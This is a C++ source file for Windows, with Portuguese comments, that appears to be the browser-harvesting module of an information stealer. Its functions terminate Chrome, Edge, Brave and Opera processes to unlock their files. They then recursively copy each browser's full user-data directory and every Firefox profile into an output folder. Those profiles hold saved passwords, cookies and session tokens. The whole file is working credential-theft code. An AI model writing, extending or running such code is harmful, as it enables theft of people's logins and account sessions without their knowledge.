#include "browsers.h"
#include "crypto.h"
#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <tlhelp32.h>

// --- Funções de suporte ---
static void kill_process(const std::wstring& exeName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName.c_str()) == 0) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProc) {
                    TerminateProcess(hProc, 0);
                    CloseHandle(hProc);
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    Sleep(1500);
}

static void copy_dir_recursive(const std::wstring& src, const std::wstring& dst) {
    CreateDirectoryW(dst.c_str(), NULL);
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW((src + L"\\*").c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        std::wstring srcFile = src + L"\\" + fd.cFileName;
        std::wstring dstFile = dst + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            copy_dir_recursive(srcFile, dstFile);
        } else {
            CopyFileW(srcFile.c_str(), dstFile.c_str(), FALSE);
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

// --- Funções exportadas no browsers.h ---

void copy_full_browser_profile(const std::wstring& name, const std::wstring& userDataPath, const std::wstring& outDir) {
    // Mata o processo do navegador pra liberar os arquivos
    if (name == L"Chrome") kill_process(L"chrome.exe");
    else if (name == L"Edge") kill_process(L"msedge.exe");
    else if (name == L"Brave") kill_process(L"brave.exe");
    else if (name == L"Opera") kill_process(L"opera.exe");

    std::wstring dstBase = outDir + L"\\browsers_full\\" + name;
    copy_dir_recursive(userDataPath, dstBase);
}

void grab_firefox(const std::wstring& outDir) {
    wchar_t appdata[MAX_PATH];
    if (!SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) return;
    std::wstring ffBase = std::wstring(appdata) + L"\\Mozilla\\Firefox\\Profiles";
    if (GetFileAttributesW(ffBase.c_str()) == INVALID_FILE_ATTRIBUTES) return;

    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((ffBase + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || fd.cFileName[0] == L'.') continue;
        copy_dir_recursive(ffBase + L"\\" + fd.cFileName, outDir + L"\\Firefox_" + fd.cFileName);
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}